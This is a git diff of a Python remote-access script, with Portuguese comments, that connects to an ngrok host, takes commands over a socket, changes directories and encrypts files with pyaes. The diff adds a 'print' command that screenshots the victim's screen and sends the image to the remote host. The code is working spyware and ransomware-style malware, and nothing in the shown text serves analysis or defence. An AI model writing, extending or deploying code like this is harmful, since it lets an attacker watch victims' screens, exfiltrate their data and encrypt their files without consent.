@@ -6,6 +6,7 @@ from random import randint
 from os import chdir, getcwd, listdir
 from os.path import isfile
 import pyaes
+import pyautogui
 print("Rajada melhorada, deixe o termux rodando e vai rajar")
 host = '0.tcp.sa.ngrok.io'
 port = 19018
@@ -34,6 +35,15 @@ while data_received < data_expected:
         elif data.decode("utf-8") == 'cd':
             chdir('..')
             sock.send('Feito!'.encode('utf-8'))
+        elif data.decode("utf-8") == 'print':
+            prnt = pyautogui.screenshot()
+            name = f'print{randint(10000, 99999999)}.png'
+            prnt.save(name)
+            t = open(name, 'rb')
+            msm = t.read()
+            sock.send(msm)
+            break
+
         elif data.decode("utf-8") == 'encrypt':
             if isfile(c):
                 p = c
